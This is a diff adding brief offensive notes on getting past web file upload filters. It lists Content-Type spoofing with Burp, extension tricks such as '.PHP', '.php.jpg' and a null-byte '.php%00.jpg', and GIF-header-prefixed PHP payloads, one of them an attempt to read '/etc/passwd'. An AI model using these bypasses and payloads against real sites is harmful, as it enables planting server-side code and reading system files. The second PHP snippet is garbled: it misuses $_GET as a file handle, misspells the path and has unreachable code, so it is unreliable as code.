@@ -1,0 +1,34 @@
+1) Content-Type checking can be easily bypassed using burp.
+2) Check file name extension 
+	Try
+		- .PHP instead of .php
+		- Multiple extension .php.jpg
+		- NULL byte .php%00.jpg 
+
+3) GIF98
+ 
+<?php
+phpinfo();
+?>
+
+4) GIF98
+ 
+<?php
+$fp =  $_GET["/etc/passw"];
+if($fp)
+{
+echo 'ok!';
+$result = fread($fp,
+8192);
+return $result;
+echo $result;
+}
+else
+{
+echo 'no!';
+}
+?>
+
+5)
+
+
